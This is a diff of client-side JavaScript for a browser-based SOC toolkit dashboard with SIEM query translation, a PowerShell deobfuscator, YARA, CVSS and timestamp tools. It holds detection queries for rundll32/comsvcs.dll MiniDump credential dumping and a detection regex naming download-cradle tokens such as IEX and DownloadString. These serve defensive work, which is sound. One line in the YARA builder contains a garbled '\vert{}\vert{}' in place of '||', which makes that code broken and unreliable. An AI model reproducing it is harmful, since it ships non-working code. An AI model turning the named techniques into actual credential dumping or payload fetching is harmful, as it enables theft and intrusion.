+      const kqlOut = clausesKql.length ? clausesKql.join(" and ") : 'process.command_line: *';
+      const splOut = `index=main ${clausesSpl.join(" ")} | table _time host User Image CommandLine`;
+      const senOut = `DeviceProcessEvents | where ${clausesSen.length ? clausesSen.join(" and ") : "true"}`;
+
       return `
-        <table class="psv-result-table">
-          <thead><tr><th>Target SIEM Backend</th><th>Translated Production Query (${esc(title)})</th></tr></thead>
+        <table class="psv-out-table">
+          <thead><tr><th>SIEM Target</th><th>Dynamically Compiled Query — ${esc(title)}</th></tr></thead>
           <tbody>
-            <tr><td class="psv-hl-ip">Elastic / Kibana KQL</td><td><code>process.executable: *\\rundll32.exe and process.command_line: *comsvcs.dll* and process.command_line: *MiniDump* and not user.name: *SYSTEM*</code></td></tr>
-            <tr><td class="psv-hl-ip">Splunk SPL</td><td><code>index=sysmon EventCode=1 Image="*\\rundll32.exe" CommandLine="*comsvcs.dll*" CommandLine="*MiniDump*" NOT User="*SYSTEM*"</code></td></tr>
-            <tr><td class="psv-hl-ip">Microsoft Sentinel KQL</td><td><code>DeviceProcessEvents | where FileName endswith "rundll32.exe" and ProcessCommandLine has_all ("comsvcs.dll", "MiniDump") and not(AccountName contains "SYSTEM")</code></td></tr>
+            <tr><td style="color:#38bdf8;font-weight:700;">Elastic / Kibana KQL</td><td><code>${esc(kqlOut)}</code></td></tr>
+            <tr><td style="color:#38bdf8;font-weight:700;">Splunk SPL</td><td><code>${esc(splOut)}</code></td></tr>
+            <tr><td style="color:#38bdf8;font-weight:700;">Microsoft Sentinel KQL</td><td><code>${esc(senOut)}</code></td></tr>
           </tbody>
         </table>
       `;
@@ -923,44 +1170,93 @@ CONTAINMENT::Isolated both hosts in EDR, revoked active sessions, rotated svc_sq
 
     if (tool.id === "events") {
       const q = input.toLowerCase();
-      const list = EVENT_DB.filter(e => e.id.includes(q) || e.title.toLowerCase().includes(q) || e.mitre.toLowerCase().includes(q));
-      const rows = (list.length ? list : EVENT_DB).map(e => `
-        <tr><td class="psv-hl-ip">ID ${esc(e.id)}</td><td>${esc(e.source)}</td><td>${esc(e.title)}</td><td class="psv-hl-warn">${esc(e.mitre)}</td><td><code>${esc(e.kql)}</code></td></tr>
-      `);
+      const filtered = EVENT_DB.filter(e => {
+        if (selectedOptionIdx === 1 && e.source !== "Windows Security") return false;
+        if (selectedOptionIdx === 2 && e.source !== "Sysmon") return false;
+        if (q === "all" || !q) return true;
+        return e.id.toLowerCase().includes(q) || e.title.toLowerCase().includes(q) || e.mitre.toLowerCase().includes(q) || e.fields.toLowerCase().includes(q);
+      });
+      const list = filtered.length ? filtered : EVENT_DB;
       return `
-        <table class="psv-result-table">
-          <thead><tr><th>Event ID</th><th>Log Source</th><th>Event Description</th><th>MITRE ATT&CK</th><th>Hunting Query (KQL)</th></tr></thead>
-          <tbody>${rows.join("")}</tbody>
-        </table>
-      `;
-    }
-
-    if (tool.id === "yara") {
-      const name = ((input.match(/RULE_NAME::(\S+)/i) || [])[1] || "SOC_Rule").replace(/[^a-zA-Z0-9_]/g, "_");
-      return `
-        <table class="psv-result-table">
-          <thead><tr><th>Validation Check</th><th>Status</th><th>Compiled YARA Output</th></tr></thead>
+        <table class="psv-out-table">
+          <thead><tr><th>Event ID</th><th>Source</th><th>Description & Key XML Fields</th><th>MITRE ATT&CK</th><th>Elastic KQL Hunt & Tuning</th></tr></thead>
           <tbody>
-            <tr><td>Rule Identifier</td><td class="psv-hl-ok">✓ Valid (${esc(name)})</td><td rowspan="3"><pre style="margin:0;color:#38bdf8;">rule ${esc(name)} {\n  condition:\n    uint16(0) == 0x5A4D and filesize &lt; 5MB and any of them\n}</pre></td></tr>
-            <tr><td>PE Header Signature</td><td class="psv-hl-ok">✓ uint16(0) == 0x5A4D</td></tr>
-            <tr><td>String & Hex Syntax</td><td class="psv-hl-ok">✓ Linter Passed</td></tr>
+            ${list.map(e => `<tr><td style="color:#38bdf8;font-weight:800;">ID ${esc(e.id)}</td><td>${esc(e.source)}</td><td><strong>${esc(e.title)}</strong><br><span style="color:#94a3b8;font-size:0.74rem;">Fields: ${esc(e.fields)}</span></td><td style="color:#fbbf24;">${esc(e.mitre)}</td><td><code>${esc(e.kql)}</code><br><span style="color:#94a3b8;font-size:0.73rem;">Tuning: ${esc(e.fp)}</span></td></tr>`).join("")}
           </tbody>
         </table>
       `;
     }
 
+    if (tool.id === "regex") {
+      const parts = input.split(/LOG::/i);
+      const patternStr = parts.length > 1 ? parts[0].replace(/^PATTERN::/i, "").trim() : "(?<ip>\\d+\\.\\d+\\.\\d+\\.\\d+)";
+      const logBody = parts.length > 1 ? parts[1].trim() : input;
+      try {
+        const rx = new RegExp(patternStr, "gm");
+        const matches = Array.from(logBody.matchAll(rx));
+        if (!matches.length) return `<div style="color:#fbbf24;">0 matches found for pattern: <code>${esc(patternStr)}</code></div>`;
+        const groupKeys = matches[0].groups ? Object.keys(matches[0].groups) : [];
+        if (groupKeys.length) {
+          return `
+            <table class="psv-out-table">
+              <thead><tr><th>#</th>${groupKeys.map(k => `<th>${esc(k)}</th>`).join("")}</tr></thead>
+              <tbody>
+                ${matches.map((m, idx) => `<tr><td>${idx + 1}</td>${groupKeys.map(k => `<td style="color:#38bdf8;">${esc(m.groups[k] || "")}</td>`).join("")}</tr>`).join("")}
+              </tbody>
+            </table>
+          `;
+        }
+        return `
+          <table class="psv-out-table">
+            <thead><tr><th>Match #</th><th>Full Match</th><th>Capture Groups</th></tr></thead>
+            <tbody>${matches.map((m, idx) => `<tr><td>${idx + 1}</td><td style="color:#38bdf8;">${esc(m[0])}</td><td>${esc(m.slice(1).join(" | "))}</td></tr>`).join("")}</tbody>
+          </table>
+        `;
+      } catch (err) {
+        return `<div style="color:#f87171;">Regex Syntax Error: ${esc(err.message)}</div>`;
+      }
+    }
+
+    if (tool.id === "yara") {
+      const name = ((input.match(/RULE_NAME::(\S+)/i) || [])[1] || "SOC_Custom_Rule").replace(/[^a-zA-Z0-9_]/g, "_");
+      const author = ((input.match(/META_AUTHOR::(.+)/i) || [])[1] || "SOC Analyst").trim();
+      const sev = ((input.match(/META_SEVERITY::(.+)/i) || [])[1] || "High").trim();
+      const stringsRaw = ((input.match(/STRINGS::([\s\S]*?)(?=CONDITION::|$)/i) \vert{}\vert{} [])[1] \vert{}\vert{} '$s1 = "suspicious" ascii').trim();
+      const condRaw = ((input.match(/CONDITION::([\s\S]*)$/i) || [])[1] || "uint16(0) == 0x5A4D and any of them").trim();
+
+      const definedVars = Array.from(stringsRaw.matchAll(/(\$[A-Za-z0-9_]+)\s*=/g)).map(m => m[1]);
+      const unreferenced = definedVars.filter(v => !condRaw.includes(v) && !condRaw.includes("them") && !condRaw.includes(v.slice(0, 2) + "*"));
+      const compiled = `rule ${name} {\n  meta:\n    author = "${author}"\n    severity = "${sev}"\n    date = "${new Date().toISOString().slice(0, 10)}"\n  strings:\n    ${stringsRaw.split("\n").join("\n    ")}\n  condition:\n    ${condRaw}\n}`;
+
+      return `
+        <div style="margin-bottom:0.65rem;font-size:0.8rem;color:${unreferenced.length ? "#fbbf24" : "#34d399"};">
+          ${unreferenced.length ? `⚠️ Linter Warning: Unreferenced string variable(s): ${esc(unreferenced.join(", "))}` : `✓ YARA Linter Passed: ${definedVars.length} strings validated`}
+        </div>
+        <pre style="margin:0;color:#38bdf8;font-family:'JetBrains Mono',monospace;font-size:0.8rem;white-space:pre-wrap;">${esc(compiled)}</pre>
+      `;
+    }
+
     if (tool.id === "deobfuscator") {
       let decoded = input;
-      const b64 = input.match(/-EncodedCommand\s+([A-Za-z0-9+/=]+)/i) || input.match(/([A-Za-z0-9+/=]{24,})/);
+      let method = "URL / Plaintext Unescape";
+      const b64 = input.match(/-enc(?:odedcommand)?\s+([A-Za-z0-9+/=]+)/i) || input.match(/([A-Za-z0-9+/=]{20,})/);
       if (b64) {
-        try { decoded = atob(b64[1]).replace(/\x00/g, ""); } catch (e) {}
+        try {
+          const raw = atob(b64[1]);
+          method = raw.includes("\x00") ? "UTF-16LE PowerShell Base64" : "Standard Base64";
+          decoded = raw.replace(/\x00/g, "");
+        } catch (e) {}
+      } else {
+        try { decoded = decodeURIComponent(input); } catch (e) {}
       }
+      const alerts = Array.from(new Set(decoded.match(/IEX|Invoke-Expression|DownloadString|WebClient|FromBase64String|VirtualAlloc|rundll32|comsvcs|https?:\/\/[^\s'"]+/gi) || []));
       return `
-        <table class="psv-result-table">
-          <thead><tr><th>Stage</th><th>Encoding Detected</th><th>De-obfuscated Output / IOCs</th></tr></thead>
+        <table class="psv-out-table">
+          <thead><tr><th>Analysis Stage</th><th>Result</th></tr></thead>
           <tbody>
-            <tr><td>Layer 1</td><td class="psv-hl-warn">UTF-16LE Base64 (-EncodedCommand)</td><td class="psv-hl-ip">${esc(decoded)}</td></tr>
-            <tr><td>Behavior Alert</td><td class="psv-hl-warn">T1059.001 PowerShell Cradle</td><td>Suspicious tokens: <code>IEX</code>, <code>Net.WebClient</code>, <code>DownloadString</code></td></tr>
+            <tr><td>Detected Encoding</td><td style="color:#fbbf24;">${esc(method)}</td></tr>
+            <tr><td>De-obfuscated Plaintext</td><td style="color:#38bdf8;font-weight:600;">${esc(decoded)}</td></tr>
+            <tr><td>Extracted Indicators / APIs</td><td style="color:#f87171;">${esc(alerts.map(defang).join(" , ") || "None flagged")}</td></tr>
           </tbody>
         </table>
       `;
@@ -969,51 +1265,126 @@ CONTAINMENT::Isolated both hosts in EDR, revoked active sessions, rotated svc_sq
     if (tool.id === "json") {
       try {
         const obj = JSON.parse(input);
-        return `<pre style="margin:0;color:#38bdf8;font-family:'JetBrains Mono',monospace;font-size:0.79rem;">${esc(JSON.stringify(obj, null, 2))}</pre>`;
-      } catch (e) {
-        return `<div class="psv-hl-warn">Invalid JSON: ${esc(e.message)}</div>`;
+        const flat = {};
+        (function flatten(curr, prop) {
+          if (Object(curr) !== curr) {
+            flat[prop] = curr;
+          } else if (Array.isArray(curr)) {
+            flat[prop] = JSON.stringify(curr);
+          } else {
+            for (const p in curr) flatten(curr[p], prop ? prop + "." + p : p);
+          }
+        })(obj, "");
+
+        return `
+          <table class="psv-out-table" style="margin-bottom:1rem;">
+            <thead><tr><th>Flattened ECS / SIEM Field Path</th><th>Extracted Value</th></tr></thead>
+            <tbody>${Object.keys(flat).map(k => `<tr><td style="color:#38bdf8;">${esc(k)}</td><td>${esc(flat[k])}</td></tr>`).join("")}</tbody>
+          </table>
+          <pre style="margin:0;color:#cbd5e1;font-family:'JetBrains Mono',monospace;font-size:0.78rem;">${esc(JSON.stringify(obj, null, 2))}</pre>
+        `;
+      } catch (err) {
+        return `<div style="color:#f87171;">JSON Syntax Error: ${esc(err.message)}</div>`;
       }
     }
 
     if (tool.id === "timestamp") {
-      const sec = /^\d+$/.test(input) ? parseInt(input.slice(0, 10), 10) : Math.floor(Date.now() / 1000);
-      const d = new Date(sec * 1000);
+      const targetStr = selectedOptionIdx === 1 ? String(Math.floor(Date.now() / 1000)) : input;
+      let d;
+      if (/^\d{10}$/.test(targetStr)) d = new Date(parseInt(targetStr, 10) * 1000);
+      else if (/^\d{13}$/.test(targetStr)) d = new Date(parseInt(targetStr, 10));
+      else if (/^\d{18}$/.test(targetStr)) d = new Date(Number(BigInt(targetStr) / 10000n - 11644473600000n));
+      else d = new Date(targetStr);
+
+      if (isNaN(d.getTime())) return `<div style="color:#f87171;">Invalid timestamp format: ${esc(targetStr)}</div>`;
+      const sec = Math.floor(d.getTime() / 1000);
+      const ms = d.getTime();
+      const ft = (BigInt(ms) + 11644473600000n) * 10000n;
       return `
-        <table class="psv-result-table">
-          <thead><tr><th>Format</th><th>Converted Timestamp Value</th></tr></thead>
+        <table class="psv-out-table">
+          <thead><tr><th>Timestamp Representation</th><th>Converted Value</th></tr></thead>
           <tbody>
-            <tr><td>UTC / ISO-8601</td><td class="psv-hl-ip">${esc(d.toISOString())}</td></tr>
+            <tr><td>ISO-8601 (UTC)</td><td style="color:#38bdf8;font-weight:700;">${esc(d.toISOString())}</td></tr>
+            <tr><td>UTC String</td><td>${esc(d.toUTCString())}</td></tr>
             <tr><td>Analyst Local Time</td><td>${esc(d.toString())}</td></tr>
-            <tr><td>Unix Epoch (Seconds / ms)</td><td>${sec} / ${sec * 1000}</td></tr>
+            <tr><td>Unix Epoch (Seconds)</td><td>${sec}</td></tr>
+            <tr><td>Unix Epoch (Milliseconds)</td><td>${ms}</td></tr>
+            <tr><td>Windows FileTime / LDAP (18-digit)</td><td>${ft.toString()}</td></tr>
           </tbody>
         </table>
       `;
     }
 
     if (tool.id === "severity") {
+      let score = 25;
+      if (/tier1_dc|domain_controller|critical/i.test(input)) score += 25;
+      else if (/server|production/i.test(input)) score += 15;
+      if (/regulated_pii|pci|hipaa|secret/i.test(input)) score += 20;
+      if (/multi_host_lateral|domain_wide/i.test(input)) score += 15;
+      if (/active_c2_exfil|ransomware/i.test(input)) score += 15;
+      if (/domain_admin|root|system/i.test(input)) score += 10;
+      score = Math.min(100, score);
+      const p = score >= 85 ? "P1 — Critical (SLA: 15 mins)" : score >= 65 ? "P2 — High (SLA: 1 hour)" : score >= 40 ? "P3 — Medium (SLA: 4 hours)" : "P4 — Low (SLA: 24 hours)";
+
       return `
-        <table class="psv-result-table">
-          <thead><tr><th>Triage Dimension</th><th>Assessment</th><th>Recommended Action</th></tr></thead>
+        <table class="psv-out-table">
+          <thead><tr><th>Metric</th><th>Calculated Result</th></tr></thead>
           <tbody>
-            <tr><td>Calculated Priority</td><td class="psv-hl-warn">P1 — Critical (Score: 95/100)</td><td>15-Minute SOC Escalation SLA</td></tr>
-            <tr><td>Containment Step 1</td><td class="psv-hl-ip">Host Isolation</td><td>Isolate Tier-1 DC / Endpoint in EDR immediately</td></tr>
-            <tr><td>Containment Step 2</td><td class="psv-hl-ip">Identity Revocation</td><td>Revoke active Kerberos TGTs and rotate compromised credentials</td></tr>
+            <tr><td>Incident Priority & SLA</td><td style="color:${score >= 85 ? "#f87171" : "#fbbf24"};font-weight:800;">${esc(p)}</td></tr>
+            <tr><td>Composite Triage Risk Score</td><td style="color:#38bdf8;font-weight:700;">${score} / 100</td></tr>
+            <tr><td>Mandatory Containment Actions</td><td>1. Isolate affected host(s) in EDR immediately.<br>2. Revoke active session tokens & Kerberos TGTs.<br>3. Block external C2 indicators at firewall/DNS.</td></tr>
           </tbody>
         </table>
       `;
     }
 
     if (tool.id === "report") {
-      return `<pre style="margin:0;color:#e2e8f0;font-family:'JetBrains Mono',monospace;font-size:0.79rem;"># SOC INCIDENT REPORT\n${esc(defang(input))}</pre>`;
+      const getVal = k => ((input.match(new RegExp(k + "::([\\s\\S]*?)(?=\\n[A-Z_]+::|$)", "i")) || [])[1] || "").trim();
+      const md = `# SOC INCIDENT REPORT — ${getVal("INCIDENT_ID") || "INC-2026"}\n**Title:** ${getVal("TITLE")}\n**Severity:** ${getVal("SEVERITY")}\n**Detection Source:** ${getVal("DETECTION_SOURCE")}\n\n## 1. Affected Assets\n${getVal("AFFECTED_ASSETS")}\n\n## 2. MITRE ATT&CK Tactics & Techniques\n${getVal("MITRE_TACTICS")}\n\n## 3. Investigation Timeline (UTC)\n${getVal("TIMELINE")}\n\n## 4. Defanged Indicators of Compromise\n${defang(getVal("IOCS"))}\n\n## 5. Containment & Eradication Actions\n${getVal("CONTAINMENT")}`;
+      return `<pre style="margin:0;color:#38bdf8;font-family:'JetBrains Mono',monospace;font-size:0.8rem;white-space:pre-wrap;">${esc(md)}</pre>`;
     }
 
     if (tool.id === "cvss") {
+      const m = {};
+      input.split("/").forEach(p => {
+        const kv = p.split(":");
+        if (kv.length === 2) m[kv[0].toUpperCase()] = kv[1].toUpperCase();
+      });
+      const av = { N: 0.85, A: 0.62, L: 0.55, P: 0.2 }[m.AV] || 0.85;
+      const ac = { L: 0.77, H: 0.44 }[m.AC] || 0.77;
+      const sc = m.S === "C";
+      const pr = (sc ? { N: 0.85, L: 0.68, H: 0.5 } : { N: 0.85, L: 0.62, H: 0.27 })[m.PR] ?? 0.85;
+      const ui = { N: 0.85, R: 0.62 }[m.UI] || 0.85;
+      const c = { H: 0.56, L: 0.22, N: 0 }[m.C] ?? 0.56;
+      const i = { H: 0.56, L: 0.22, N: 0 }[m.I] ?? 0.56;
+      const a = { H: 0.56, L: 0.22, N: 0 }[m.A] ?? 0.56;
+
+      const iss = 1 - (1 - c) * (1 - i) * (1 - a);
+      const impact = sc ? 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15) : 6.42 * iss;
+      const exploit = 8.22 * av * ac * pr * ui;
+      const roundUp = v => Math.ceil(Math.round(v * 100000) / 10000) / 10;
+      const base = iss <= 0 ? 0 : roundUp(Math.min(sc ? 1.08 * (impact + exploit) : impact + exploit, 10));
+
+      const eW = { X: 1, H: 1, F: 0.97, P: 0.94, U: 0.91 }[m.E] || 1;
+      const rlW = { X: 1, U: 1, W: 0.97, T: 0.96, O: 0.95 }[m.RL] || 1;
+      const rcW = { X: 1, C: 1, R: 0.96, U: 0.92 }[m.RC] || 1;
+      const temporal = roundUp(base * eW * rlW * rcW);
+
+      const crW = { X: 1, H: 1.5, M: 1.0, L: 0.5 }[m.CR] || 1;
+      const irW = { X: 1, H: 1.5, M: 1.0, L: 0.5 }[m.IR] || 1;
+      const arW = { X: 1, H: 1.5, M: 1.0, L: 0.5 }[m.AR] || 1;
+      const miss = Math.min(1 - (1 - c * crW) * (1 - i * irW) * (1 - a * arW), 0.915);
+      const mImpact = sc ? 7.52 * (miss - 0.029) - 3.25 * Math.pow(miss * 0.9731 - 0.02, 13) : 6.42 * miss;
+      const env = iss <= 0 ? 0 : roundUp(roundUp(Math.min(sc ? 1.08 * (mImpact + exploit) : mImpact + exploit, 10)) * eW * rlW * rcW);
+      const rating = s => (s >= 9.0 ? "CRITICAL" : s >= 7.0 ? "HIGH" : s >= 4.0 ? "MEDIUM" : s > 0 ? "LOW" : "NONE");
+
       return `
-        <table class="psv-result-table">
-          <thead><tr><th>CVSS v3.1 Metric Group</th><th>Calculated Score</th><th>Severity Rating</th><th>Vector String</th></tr></thead>
+        <table class="psv-out-table">
+          <thead><tr><th>CVSS v3.1 Metric Group</th><th>Calculated Score</th><th>Severity Rating</th><th>Sub-Score Details</th></tr></thead>
           <tbody>
-            <tr><td>Base Score</td><td class="psv-hl-warn">10.0 / 10.0</td><td class="psv-hl-warn">CRITICAL</td><td><code>${esc(input)}</code></td></tr>
-            <tr><td>Temporal Score</td><td class="psv-hl-ip">9.3 / 10.0</td><td class="psv-hl-warn">CRITICAL (Functional Exploit)</td><td>Scope: Changed (S:C)</td></tr>
+            <tr><td><strong>Base Score</strong></td><td style="color:#f87171;font-weight:800;font-size:0.95rem;">${base.toFixed(1)} / 10.0</td><td>${rating(base)}</td><td>Impact: ${impact.toFixed(2)} | Exploitability: ${exploit.toFixed(2)}</td></tr>
+            <tr><td><strong>Temporal Score</strong></td><td style="color:#fbbf24;font-weight:800;font-size:0.95rem;">${temporal.toFixed(1)} / 10.0</td><td>${rating(temporal)}</td><td>E:${m.E || "X"} | RL:${m.RL || "X"} | RC:${m.RC || "X"}</td></tr>
+            <tr><td><strong>Environmental Score</strong></td><td style="color:#38bdf8;font-weight:800;font-size:0.95rem;">${env.toFixed(1)} / 10.0</td><td>${rating(env)}</td><td>CR:${m.CR || "X"} | IR:${m.IR || "X"} | AR:${m.AR || "X"}</td></tr>
           </tbody>
         </table>
       `;
@@ -1022,222 +1393,324 @@ CONTAINMENT::Isolated both hosts in EDR, revoked active sessions, rotated svc_sq
     return "";
   }
 
-  function renderDashboard() {
-    injectDashboardStyles();
-    const root = document.getElementById("psv-workbench-root") || document.querySelector(".md-content__inner");
-    if (!root) return;
-
-    const filteredTools = TOOLS.filter(t => {
-      const catMatch = activeCat === "all" || t.cat === activeCat;
-      const qMatch = !searchQuery || t.title.toLowerCase().includes(searchQuery) || t.desc.toLowerCase().includes(searchQuery) || t.tags.some(tag => tag.toLowerCase().includes(searchQuery));
-      return catMatch && qMatch;
+  function renderCatalogView(root) {
+    const filtered = TOOLS.filter(t => {
+      const catOk = activeCat === "all" || t.cat === activeCat;
+      const qOk = !searchQuery || t.title.toLowerCase().includes(searchQuery) || t.desc.toLowerCase().includes(searchQuery) || t.tags.some(g => g.toLowerCase().includes(searchQuery));
+      return catOk && qOk;
     });
 
-    const activeTool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
-    const currentInputEl = document.getElementById("psv-live-input");
-    const currentInputVal = currentInputEl && currentInputEl.dataset.tool === activeTool.id ? currentInputEl.value : activeTool.sample;
-
     root.innerHTML = `
-      <div id="psv-dashboard">
-        <!-- Top Brand & Search Bar -->
-        <div class="psv-top-bar">
-          <div class="psv-brand-group">
-            <div class="psv-brand-logo">
-              <div class="psv-shield-icon">${ICONS.shield}</div>
-              <div>
-                <div class="psv-brand-title">PSV <span>TOOLS</span></div>
-                <div class="psv-brand-domain">tools.privacyskillvault.com</div>
-              </div>
+      <div id="psv-app">
+        <!-- Hero Split Section (Screenshot 3 Layout in Royal Blue) -->
+        <div class="psv-hero-split">
+          <div>
+            <div class="psv-eyebrow">// INTERACTIVE SECURITY TOOLS</div>
+            <h1 class="psv-hero-h1">Free <span>Security Tools</span><br>Built for Defenders.</h1>
+            <p class="psv-hero-desc">13 privacy-first SOC, threat intelligence, DFIR, and detection engineering tools. Everything runs entirely in your browser with zero server uploads.</p>
+            <div class="psv-stats-bar">
+              <div class="psv-stat-cell"><div class="psv-stat-val">13</div><div class="psv-stat-lbl">Security Tools</div></div>
+              <div class="psv-stat-cell"><div class="psv-stat-val">0</div><div class="psv-stat-lbl">Server Calls</div></div>
+              <div class="psv-stat-cell"><div class="psv-stat-val">100%</div><div class="psv-stat-lbl">Client-Side</div></div>
             </div>
-            <div class="psv-brand-divider"></div>
-            <div class="psv-brand-tagline">Practical security utilities<br>for analysts and defenders.</div>
           </div>
 
-          <div class="psv-search-wrap">
-            <span class="psv-search-icon">🔍</span>
-            <input type="search" id="psv-global-search" class="psv-search-input" placeholder="Search tools, keywords (e.g. logs, sigma, hash, domain, cve, ...)" value="${esc(searchQuery)}" />
-          </div>
-        </div>
-
-        <!-- Category Filter Pills -->
-        <div class="psv-cat-row">
-          ${CATEGORIES.map(c => {
-            const count = c.id === "all" ? TOOLS.length : TOOLS.filter(t => t.cat === c.id).length;
-            return `
-              <button type="button" class="psv-cat-pill ${activeCat === c.id ? "active" : ""}" onclick="window.PSVDash.setCategory('${c.id}')">
-                ${ICONS[c.icon] || ICONS.grid}
-                <span>${esc(c.label)}</span>
-                <span class="psv-cat-count">${count}</span>
-              </button>
-            `;
-          }).join("")}
-        </div>
-
-        <!-- 3-Column Tool Cards Grid -->
-        <div class="psv-cards-grid">
-          ${filteredTools.slice(0, 6).map(t => `
-            <div class="psv-card ${t.id === activeTool.id ? "active-card" : ""}">
-              <div>
-                <div class="psv-card-top">
-                  <div class="psv-card-icon">${ICONS[t.icon] || ICONS.shield}</div>
-                  <div>
-                    <h3 class="psv-card-title">${esc(t.title)}</h3>
-                    <p class="psv-card-desc">${esc(t.desc)}</p>
-                  </div>
-                </div>
-                <div class="psv-tag-row">
-                  ${t.tags.map(tag => `<span class="psv-tag">${esc(tag)}</span>`).join("")}
-                </div>
-              </div>
-              <div class="psv-card-footer">
-                <button type="button" class="psv-open-btn" onclick="window.PSVDash.openTool('${t.id}', true)">Open tool →</button>
-                <div class="psv-privacy-note">
-                  ${ICONS.lock}
-                  <div><strong>Runs in your browser</strong>No data is sent to any server</div>
-                </div>
-              </div>
+          <div class="psv-preview-box">
+            <div class="psv-preview-top">
+              <span>PSV // QUICK-LAUNCH MATRIX</span>
+              <span>100% IN-BROWSER</span>
             </div>
-          `).join("")}
-        </div>
-
-        <!-- Lower Split-Pane Interactive Workbench -->
-        <div class="psv-workbench-shell" id="psv-workbench-anchor">
-          <div class="psv-side-nav">
-            <div class="psv-side-header">Tools (${TOOLS.length})</div>
-            <div class="psv-side-list">
-              ${TOOLS.map(t => `
-                <button type="button" class="psv-side-item ${t.id === activeTool.id ? "active" : ""}" onclick="window.PSVDash.openTool('${t.id}', false)">
-                  ${ICONS[t.icon] || ICONS.shield}
-                  <span>${esc(t.title)}</span>
-                </button>
+            <div class="psv-preview-mini-grid">
+              ${TOOLS.slice(0, 9).map(t => `
+                <div class="psv-mini-tile" onclick="window.PSVApp.openTool('${t.id}')">
+                  <span>[${esc(t.badge)}]</span>${esc(t.title.split(" ")[0] + " " + (t.title.split(" ")[1] || ""))}
+                </div>
               `).join("")}
             </div>
           </div>
+        </div>
 
-          <div class="psv-main-pane">
-            <div class="psv-pane-top">
-              <div class="psv-pane-title-wrap">
-                <div class="psv-card-icon">${ICONS[activeTool.icon] || ICONS.shield}</div>
-                <div>
-                  <h2 class="psv-pane-title">${esc(activeTool.title)}</h2>
-                  <p class="psv-pane-sub">${esc(activeTool.desc)}</p>
-                </div>
-              </div>
-              <div class="psv-pane-controls">
-                <div class="psv-local-badge">
-                  ${ICONS.lock}
-                  <div><strong>Local processing only</strong>Your data stays in your browser</div>
-                </div>
-                <button type="button" class="psv-clear-btn" onclick="window.PSVDash.loadSample()">⚡ Load Sample</button>
-                <button type="button" class="psv-clear-btn" onclick="window.PSVDash.clearInput()">🗑️ Clear all</button>
-              </div>
+        <!-- Main Catalog Frame -->
+        <div class="psv-catalog-window">
+          <div class="psv-window-bar">
+            <div class="psv-window-dots">
+              <span class="psv-dot"></span><span class="psv-dot"></span><span class="psv-dot"></span>
+              <span style="margin-left:0.5rem;">PSV // SECURITY-TOOLS-CATALOG</span>
+            </div>
+            <span>13 TOOLS · ZERO TELEMETRY · CLIENT-SIDE</span>
+          </div>
+
+          <div class="psv-catalog-body">
+            <input type="search" id="psv-cat-search" class="psv-search-bar" placeholder="Search 13 tools (e.g. ioc, sigma, sysmon, yara, phishing, cvss, timestamp)..." value="${esc(searchQuery)}" />
+
+            <div class="psv-cat-pills">
+              ${CATEGORIES.map(c => {
+                const count = c.id === "all" ? TOOLS.length : TOOLS.filter(t => t.cat === c.id).length;
+                return `<button type="button" class="psv-pill ${activeCat === c.id ? "active" : ""}" onclick="window.PSVApp.setCat('${c.id}')">${esc(c.label)} (${count})</button>`;
+              }).join("")}
             </div>
 
-            <div class="psv-tabs-bar">
-              <button type="button" class="psv-tab-btn ${activeTab === "overview" ? "active" : ""}" onclick="window.PSVDash.setTab('overview')">Overview</button>
-              <button type="button" class="psv-tab-btn ${activeTab === "input" ? "active" : ""}" onclick="window.PSVDash.setTab('input')">Input & Run</button>
-              <button type="button" class="psv-tab-btn ${activeTab === "results" ? "active" : ""}" onclick="window.PSVDash.setTab('results')">Results</button>
-            </div>
-
-            <div class="psv-overview-grid">
-              <div class="psv-about-box">
-                <h4>About</h4>
-                <p>${esc(activeTool.desc)}</p>
-                <h4>Key Features</h4>
-                <ul class="psv-feat-list">
-                  ${activeTool.features.map(f => `<li>${esc(f)}</li>`).join("")}
-                </ul>
-                <label style="font-size:0.75rem;font-weight:700;color:#94a3b8;text-transform:uppercase;display:block;margin-bottom:0.35rem;">Live Input Telemetry (Edit to test)</label>
-                <textarea id="psv-live-input" data-tool="${esc(activeTool.id)}" class="psv-input-editor" spellcheck="false">${esc(currentInputVal)}</textarea>
-                <button type="button" class="psv-open-btn" style="width:100%;" onclick="window.PSVDash.runCurrent()">▶ Run Analysis</button>
-              </div>
-
-              <div class="psv-example-box">
-                <div class="psv-example-head">
+            <div class="psv-cards-grid">
+              ${filtered.map(t => `
+                <div class="psv-tool-card" onclick="window.PSVApp.openTool('${t.id}')">
                   <div>
-                    <strong style="color:#ffffff;font-size:0.95rem;">Live Analysis Output — ${esc(activeTool.title)}</strong>
-                    <div style="font-size:0.76rem;color:#94a3b8;">Sample query and real-time parsed output.</div>
+                    <div class="psv-card-head">
+                      <span class="psv-card-badge">${esc(t.badge)}</span>
+                      <span class="psv-card-cat-lbl">${esc(t.cat.toUpperCase())}</span>
+                    </div>
+                    <h3 class="psv-card-title">${esc(t.title)}</h3>
+                    <p class="psv-card-desc">${esc(t.desc)}</p>
                   </div>
-                  <span class="psv-sample-badge">${esc(activeTool.sampleName)}</span>
+                  <div class="psv-card-foot">
+                    <span class="psv-client-tag">● Client-Side</span>
+                    <span class="psv-open-link">Open Tool →</span>
+                  </div>
                 </div>
-                <div class="psv-query-bar">${esc(activeTool.sampleQuery)}</div>
-                <div id="psv-live-results">${buildToolOutputHTML(activeTool, currentInputVal)}</div>
-              </div>
+              `).join("")}
             </div>
           </div>
         </div>
       </div>
     `;
 
-    const sInput = document.getElementById("psv-global-search");
-    if (sInput) {
-      sInput.addEventListener("input", function (e) {
+    const sEl = document.getElementById("psv-cat-search");
+    if (sEl) {
+      sEl.addEventListener("input", function (e) {
         searchQuery = e.target.value.toLowerCase();
-        renderDashboard();
-        const el = document.getElementById("psv-global-search");
-        if (el) {
-          el.focus();
-          el.setSelectionRange(el.value.length, el.value.length);
+        renderCatalogView(root);
+        const restored = document.getElementById("psv-cat-search");
+        if (restored) {
+          restored.focus();
+          restored.setSelectionRange(restored.value.length, restored.value.length);
         }
-      });
-    }
-
-    const liveIn = document.getElementById("psv-live-input");
-    if (liveIn) {
-      liveIn.addEventListener("input", function () {
-        window.PSVDash.runCurrent();
       });
     }
   }
 
-  window.PSVDash = {
-    setCategory: function (catId) {
+  function renderSingleToolView(root) {
+    const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
+    const currentInput = userInputs[tool.id] !== undefined ? userInputs[tool.id] : tool.sample;
+    const relatedTools = (tool.related || []).map(rid => TOOLS.find(t => t.id === rid)).filter(Boolean);
+
+    root.innerHTML = `
+      <div id="psv-app">
+        <div class="psv-tool-page">
